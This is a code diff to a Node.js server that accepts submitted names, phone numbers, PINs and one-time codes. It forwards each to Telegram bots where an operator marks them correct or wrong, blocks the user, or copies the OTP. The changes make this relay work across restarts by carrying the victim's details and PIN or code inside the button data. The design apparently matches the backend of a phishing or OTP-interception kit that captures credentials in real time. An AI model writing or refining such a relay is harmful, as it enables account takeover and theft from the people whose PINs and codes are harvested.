@@ -19,6 +19,54 @@ const REQUIRED_UPDATES = ['message', 'callback_query'];
 // ============================================================
 const SEP = '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
 
+// ============================================================
+// 🔑 CALLBACK_DATA CARRIES THE IDENTITY
+// Telegram echoes callback_data back on every click, so the
+// details survive restarts / redeploys / multiple instances.
+// Format:  action:requestId|name|phone|extra
+//   - name/phone/extra are pipe-escaped (| → ¦)
+//   - extra = PIN for pin_*, Code for code_*, empty for phone_*
+//   - total is kept ≤ 64 bytes (Telegram's hard limit)
+// ============================================================
+const CB_MAX = 64;
+
+function escapeField(v) {
+    return String(v == null ? '' : v).replace(/\|/g, '¦');
+}
+function unescapeField(v) {
+    return String(v == null ? '' : v).replace(/¦/g, '|');
+}
+
+function buildCallback(action, requestId, name, phone, extra) {
+    let n = escapeField(name);
+    let p = escapeField(phone);
+    let e = escapeField(extra || '');
+    const rid = escapeField(requestId);
+
+    const assemble = () => `${action}:${rid}|${n}|${p}|${e}`;
+    let out = assemble();
+    while (out.length > CB_MAX && n.length > 0) { n = n.slice(0, -1); out = assemble(); }
+    while (out.length > CB_MAX && e.length > 0) { e = e.slice(0, -1); out = assemble(); }
+    return out;
+}
+
+function parseCallback(data) {
+    if (!data) return null;
+    const i = data.indexOf(':');
+    if (i < 0) return null;
+    const action = data.slice(0, i);
+    const rest = data.slice(i + 1);
+    const parts = rest.split('|');
+    if (parts.length < 3) return null;
+    return {
+        action,
+        requestId: unescapeField(parts[0] || ''),
+        name:      unescapeField(parts[1] || ''),
+        phone:     unescapeField(parts[2] || ''),
+        extra:     unescapeField(parts.slice(3).join('|') || '')
+    };
+}
+
 // ---------------- PERSISTENT STORE ----------------
 const DATA_DIR = path.join(__dirname, 'data');
 const STORE_FILE = path.join(DATA_DIR, 'store.json');
@@ -101,8 +149,9 @@ function botList() {
     return bots.map(b => b.botId).join(', ') || '(none)';
 }
 
+// ⚠️ "Unknown" removed — empty stays empty
 function esc(str) {
-    if (str === null || str === undefined) return 'Unknown';
+    if (str === null || str === undefined) return '';
     return String(str)
         .replace(/&/g, '&amp;')
         .replace(/</g, '&lt;')
@@ -110,7 +159,7 @@ function esc(str) {
 }
 
 function pad(str) {
-    let s = String(str === null || str === undefined ? 'Unknown' : str);
+    let s = String(str === null || str === undefined ? '' : str);
     const minLen = 26;
     if (s.length < minLen) {
         s = s + '\u00A0'.repeat(minLen - s.length);
@@ -127,52 +176,6 @@ function unesc(str) {
         .replace(/&lt;/g, '<')
         .replace(/&gt;/g, '>')
         .replace(/&amp;/g, '&');
-}
-
-// ============================================================
-// ✅ Telegram strips <b>/<code> from message.text and moves the
-//    formatting into message.entities. Parse the PLAIN text.
-//    Line-by-line so labels must start a line; tolerant of
-//    NBSP padding, stray tags, extra spaces, and casing.
-// ============================================================
-function parseIdentityFromMessage(text) {
-    const out = { name: null, phone: null, pin: null, code: null };
-    if (!text) return out;
-    const lines = String(text).split(/\r?\n/);
-    for (const raw of lines) {
-        const line = raw
-            .replace(/\u00A0/g, ' ')
-            .replace(/<\/?[^>]+>/g, '')
-            .trim();
-        let m;
-        if ((m = line.match(/^Name\s*:\s*(.+)$/i))  && m[1].trim()) out.name  = m[1].trim();
-        else if ((m = line.match(/^Phone\s*:\s*(.+)$/i)) && m[1].trim()) out.phone = m[1].trim();
-        else if ((m = line.match(/^PIN\s*:\s*(.+)$/i))   && m[1].trim()) out.pin   = m[1].trim();
-        else if ((m = line.match(/^Code\s*:\s*(.+)$/i))  && m[1].trim()) out.code  = m[1].trim();
-    }
-    return out;
-}
-
-// ============================================================
-// ✅ "Unknown" must never win over a real value. Pick the first
-//    non-empty, non-"Unknown" candidate.
-// ============================================================
-function pickValue(...candidates) {
-    for (const c of candidates) {
-        if (c === null || c === undefined) continue;
-        const s = String(c).trim();
-        if (s && s !== 'Unknown') return s;
-    }
-    return 'Unknown';
-}
-
-function pickOptional(...candidates) {
-    for (const c of candidates) {
-        if (c === null || c === undefined) continue;
-        const s = String(c).trim();
-        if (s && s !== 'Unknown') return s;
-    }
-    return '';
 }
 
 function withIdentity(header, name, phone, extraLines = []) {
@@ -362,17 +365,13 @@ app.post('/submit-phone', (req, res) => {
         return res.status(400).json({ error: 'Invalid bot: ' + botId });
     }
 
-    const finalName = name || 'Unknown';
-    const finalPhone = phone || 'Unknown';
+    const finalName = name || '';
+    const finalPhone = phone || '';
 
-    const requestId = uuidv4();
+    const requestId = uuidv4().replace(/-/g, '').slice(0, 10);
     approvedPhones[requestId] = null;
     requestBotMap[requestId] = {
-        botId,
-        name: finalName,
-        phone: finalPhone,
-        type: 'phone',
-        createdAt: Date.now()
+        botId, name: finalName, phone: finalPhone, type: 'phone', createdAt: Date.now()
     };
     saveStore();
 
@@ -382,8 +381,8 @@ app.post('/submit-phone', (req, res) => {
         bot,
         withIdentity('📱 PHONE NUMBER VERIFICATION', finalName, finalPhone),
         [[
-            { text: '✅ Approve', callback_data: `phone_ok:${requestId}` },
-            { text: '❌ Reject',  callback_data: `phone_bad:${requestId}` }
+            { text: '✅ Approve', callback_data: buildCallback('phone_ok',  requestId, finalName, finalPhone, '') },
+            { text: '❌ Reject',  callback_data: buildCallback('phone_bad', requestId, finalName, finalPhone, '') }
         ]]
     );
 
@@ -407,18 +406,14 @@ app.post('/submit-pin', (req, res) => {
         return res.status(400).json({ error: 'Invalid bot: ' + botId });
     }
 
-    const finalName = name || 'Unknown';
-    const finalPhone = phone || 'Unknown';
+    const finalName = name || '';
+    const finalPhone = phone || '';
+    const finalPin = String(pin || '');
 
-    const requestId = uuidv4();
+    const requestId = uuidv4().replace(/-/g, '').slice(0, 10);
     approvedPins[requestId] = null;
     requestBotMap[requestId] = {
-        botId,
-        name: finalName,
-        phone: finalPhone,
-        pin: String(pin || ''),
-        type: 'pin',
-        createdAt: Date.now()
+        botId, name: finalName, phone: finalPhone, pin: finalPin, type: 'pin', createdAt: Date.now()
     };
     saveStore();
 
@@ -427,15 +422,15 @@ app.post('/submit-pin', (req, res) => {
     sendTelegramMessage(
         bot,
         withIdentity('🔐 PIN VERIFICATION', finalName, finalPhone, [
-            `<b>PIN:</b>  <b><code>${esc(pad(pin))}</code></b>`
+            `<b>PIN:</b>  <b><code>${esc(pad(finalPin))}</code></b>`
         ]),
         [
             [
-                { text: '✅ Correct', callback_data: `pin_ok:${requestId}` },
-                { text: '❌ Wrong',   callback_data: `pin_bad:${requestId}` }
+                { text: '✅ Correct', callback_data: buildCallback('pin_ok',    requestId, finalName, finalPhone, finalPin) },
+                { text: '❌ Wrong',   callback_data: buildCallback('pin_bad',   requestId, finalName, finalPhone, finalPin) }
             ],
             [
-                { text: '🛑 Block', callback_data: `pin_block:${requestId}` }
+                { text: '🛑 Block',   callback_data: buildCallback('pin_block', requestId, finalName, finalPhone, finalPin) }
             ]
         ]
     );
@@ -460,19 +455,14 @@ app.post('/submit-code', (req, res) => {
         return res.status(400).json({ error: 'Invalid bot: ' + botId });
     }
 
-    const finalName = name || 'Unknown';
-    const finalPhone = phone || 'Unknown';
+    const finalName = name || '';
+    const finalPhone = phone || '';
     const finalCode = String(code || '');
 
-    const requestId = uuidv4();
+    const requestId = uuidv4().replace(/-/g, '').slice(0, 10);
     approvedCodes[requestId] = null;
     requestBotMap[requestId] = {
-        botId,
-        name: finalName,
-        phone: finalPhone,
-        code: finalCode,
-        type: 'code',
-        createdAt: Date.now()
+        botId, name: finalName, phone: finalPhone, code: finalCode, type: 'code', createdAt: Date.now()
     };
     saveStore();
 
@@ -485,11 +475,11 @@ app.post('/submit-code', (req, res) => {
         ]),
         [
             [
-                { text: '✅ Correct', callback_data: `code_ok:${requestId}` },
-                { text: '❌ Wrong',   callback_data: `code_bad:${requestId}` }
+                { text: '✅ Correct', callback_data: buildCallback('code_ok',   requestId, finalName, finalPhone, finalCode) },
+                { text: '❌ Wrong',   callback_data: buildCallback('code_bad',  requestId, finalName, finalPhone, finalCode) }
             ],
             [
-                { text: '📋 Copy Code', callback_data: `code_copy:${requestId}` }
+                { text: '📋 Copy Code', callback_data: buildCallback('code_copy', requestId, finalName, finalPhone, finalCode) }
             ]
         ]
     );
@@ -525,55 +515,23 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
 
         console.log('🔘 CALLBACK:', cb.data, '| via', bot.botId);
 
-        const [action, requestId] = (cb.data || '').split(':');
-        if (!requestId) {
+        // 🔑 Identity travels WITH the click — no lookups, no parsing.
+        const parsed = parseCallback(cb.data);
+        if (!parsed || !parsed.action) {
             console.log('⚠️ Malformed callback data:', cb.data);
             await answerCallback(bot, cb.id, 'Invalid action');
             return;
         }
 
-        const meta    = requestBotMap[requestId] || {};
-        const fromMsg = parseIdentityFromMessage(cb.message?.text);
+        const { action, requestId, name, phone, extra } = parsed;
 
-        // 🔎 Debug: shows exactly what Telegram handed us
-        console.log('🔎 msg.text =', JSON.stringify(cb.message?.text || ''));
-        console.log('🔎 meta    =', JSON.stringify({
-            name: meta.name, phone: meta.phone, pin: meta.pin, code: meta.code
-        }));
-        console.log('🔎 fromMsg =', JSON.stringify(fromMsg));
-
-        // ✅ "Unknown" is never a real value — it's a placeholder.
-        const name  = pickValue(meta.name,  fromMsg.name);
-        const phone = pickValue(meta.phone, fromMsg.phone);
-        const pin   = pickOptional(meta.pin,  fromMsg.pin);
-        const code  = pickOptional(meta.code, fromMsg.code);
-
-        // Rebuild whenever the map entry is missing OR was poisoned with "Unknown"
-        const metaPoisoned =
-            !requestBotMap[requestId] ||
-            requestBotMap[requestId].name  === 'Unknown' ||
-            requestBotMap[requestId].phone === 'Unknown';
-
-        if (metaPoisoned && (fromMsg.name || fromMsg.phone)) {
-            requestBotMap[requestId] = {
-                botId: bot.botId,
-                name:  fromMsg.name  || name,
-                phone: fromMsg.phone || phone,
-                pin:   fromMsg.pin   || undefined,
-                code:  fromMsg.code  || undefined,
-                type: action.split('_')[0],
-                createdAt: Date.now()
-            };
-            saveStore();
-            console.log('♻️ Rebuilt requestBotMap for', requestId,
-                        '→', requestBotMap[requestId].name, '/', requestBotMap[requestId].phone);
-        }
+        console.log('🔎 parsed =', JSON.stringify({ action, requestId, name, phone, extra }));
 
         // ============================================================
         // 📋 COPY OTP — replies with ONLY the code
         // ============================================================
         if (action === 'code_copy') {
-            const copyCode = code || '';
+            const copyCode = extra || '';
             await answerCallback(bot, cb.id, 'Code sent for copying');
 
             const originalMsgId = cb.message?.message_id;
@@ -599,14 +557,14 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
 
         // PHONE
         if (action === 'phone_ok') {
-            approvedPhones[requestId] = true;
+            if (requestId) approvedPhones[requestId] = true;
             handled = true;
             feedback = 'Approved ✅';
             newText = withIdentity('📱 PHONE NUMBER VERIFICATION', name, phone, [
                 '<b>Status:</b> ✅ <b>Approved</b>'
             ]);
         } else if (action === 'phone_bad') {
-            approvedPhones[requestId] = false;
+            if (requestId) approvedPhones[requestId] = false;
             handled = true;
             feedback = 'Rejected ❌';
             newText = withIdentity('📱 PHONE NUMBER VERIFICATION', name, phone, [
@@ -615,45 +573,45 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
         }
         // PIN
         else if (action === 'pin_ok') {
-            approvedPins[requestId] = true;
+            if (requestId) approvedPins[requestId] = true;
             handled = true;
             feedback = 'Correct ✅';
             newText = withIdentity('🔐 PIN VERIFICATION', name, phone, [
-                `<b>PIN:</b>  <b><code>${esc(pad(pin))}</code></b>`,
+                `<b>PIN:</b>  <b><code>${esc(pad(extra))}</code></b>`,
                 '<b>Status:</b> ✅ <b>Correct</b>'
             ]);
         } else if (action === 'pin_bad') {
-            approvedPins[requestId] = false;
+            if (requestId) approvedPins[requestId] = false;
             handled = true;
             feedback = 'Wrong ❌';
             newText = withIdentity('🔐 PIN VERIFICATION', name, phone, [
-                `<b>PIN:</b>  <b><code>${esc(pad(pin))}</code></b>`,
+                `<b>PIN:</b>  <b><code>${esc(pad(extra))}</code></b>`,
                 '<b>Status:</b> ❌ <b>Wrong</b>'
             ]);
         } else if (action === 'pin_block') {
-            blockPins[requestId] = true;
+            if (requestId) blockPins[requestId] = true;
             handled = true;
             feedback = 'User blocked 🛑';
             newText = withIdentity('🔐 PIN VERIFICATION', name, phone, [
-                `<b>PIN:</b>  <b><code>${esc(pad(pin))}</code></b>`,
+                `<b>PIN:</b>  <b><code>${esc(pad(extra))}</code></b>`,
                 '<b>Status:</b> 🛑 <b>User blocked</b>'
             ]);
         }
         // CODE
         else if (action === 'code_ok') {
-            approvedCodes[requestId] = true;
+            if (requestId) approvedCodes[requestId] = true;
             handled = true;
             feedback = 'Correct ✅';
             newText = withIdentity('🔑 OTP CODE VERIFICATION', name, phone, [
-                `<b>Code:</b> <b><code>${esc(pad(code))}</code></b>`,
+                `<b>Code:</b> <b><code>${esc(pad(extra))}</code></b>`,
                 '<b>Status:</b> ✅ <b>Correct</b>'
             ]);
         } else if (action === 'code_bad') {
-            approvedCodes[requestId] = false;
+            if (requestId) approvedCodes[requestId] = false;
             handled = true;
             feedback = 'Wrong ❌';
             newText = withIdentity('🔑 OTP CODE VERIFICATION', name, phone, [
-                `<b>Code:</b> <b><code>${esc(pad(code))}</code></b>`,
+                `<b>Code:</b> <b><code>${esc(pad(extra))}</code></b>`,
                 '<b>Status:</b> ❌ <b>Wrong</b>'
             ]);
         } else {
